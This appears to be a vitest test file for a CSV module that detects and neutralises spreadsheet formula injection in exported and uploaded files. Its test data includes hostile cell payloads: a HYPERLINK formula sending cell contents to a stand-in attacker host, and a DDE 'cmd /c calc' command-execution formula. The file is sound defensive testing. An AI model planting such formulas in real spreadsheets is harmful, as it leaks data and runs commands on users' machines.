import { describe, expect, it } from 'vitest';
import { csvCell, isDangerousCell, neutralizeCsv, parseCsv, sniffDelimiter, toCsv } from '../src/common/csv.js';

// CSV formula injection (THREATS.md C7).

const safe = (s: string) => neutralizeCsv(Buffer.from(s, 'utf8'));

describe('which cells a spreadsheet would run', () => {
  it.each([
    ['=1+1', true], ['+1+1', true], ['-1+1', true], ['@SUM(A1)', true], ['\t=1', true], ['\r=1', true],
    ['=HYPERLINK("https://evil.example/?"&A1,"x")', true], ["=cmd|'/c calc'!A0", true],
    ['＝1+1', true], ['＠SUM(A1)', true], ['+44 20 7946 0000', true],
    ['-5', false], ['+3.25', false], ['-1e5', false], ['1,5', false], ['hello', false], ['', false], [' =1', false], ['a=1', false],
  ])('%j -> %s', (cell, expected) => {
    expect(isDangerousCell(cell)).toBe(expected);
  });
});

describe('CSVs the app writes', () => {
  it('neutralises and quotes', () => {
    expect(csvCell('=1+1')).toBe("'=1+1");
    expect(csvCell('-5')).toBe('-5');
    expect(csvCell('a,b')).toBe('"a,b"');
    expect(csvCell('say "hi"')).toBe('"say ""hi"""');
    expect(csvCell('=A1,B1')).toBe('"\'=A1,B1"');
    expect(csvCell(null)).toBe('');
    expect(toCsv([['title', 'by'], ['=HYPERLINK("x")', '@alice']])).toBe('title,by\r\n"\'=HYPERLINK(""x"")",\'@alice\r\n');
  });
});

describe('the formulas-disabled copy of an uploaded CSV', () => {
  it('leaves a CSV with no formula cells byte-for-byte unchanged', () => {
    for (const s of ['a,b,c\n1,2,3\n', 'name;amount\r\nx;-5\r\n', '"quoted, field",x\n', 'no newline at end']) {
      const r = safe(s);
      expect(r.changed).toBe(0);
      expect(r.data.toString('utf8')).toBe(s);
    }
  });

  it('prefixes every dangerous cell, keeps quoting, line endings and the BOM', () => {
    const r = safe('﻿name,formula,n\r\nx,=1+1,-5\r\n"y","=HYPERLINK(""https://e/?""&A1)",@SUM(A1)\r\n');
    expect(r.changed).toBe(3);
    expect(r.data.toString('utf8')).toBe('﻿name,formula,n\r\nx,\'=1+1,-5\r\n"y","\'=HYPERLINK(""https://e/?""&A1)",\'@SUM(A1)\r\n');
  });

  it('handles fields with embedded newlines and tab-led formulas', () => {
    const r = safe('a,"multi\nline",\t=cmd|\'/c calc\'!A0\n');
    expect(r.changed).toBe(1);
    expect(parseCsv(r.data.toString('utf8'), ',')[0]!.map((c) => c.value)).toEqual(['a', 'multi\nline', "'\t=cmd|'/c calc'!A0"]);
  });

  it('uses the delimiter the file uses (semicolon locales)', () => {
    expect(sniffDelimiter('a;b;c\n1;2;3')).toBe(';');
    const r = safe('a;b\n=1+1;"x,=y"\n');
    expect(r.data.toString('utf8')).toBe('a;b\n\'=1+1;"x,=y"\n');
  });
});
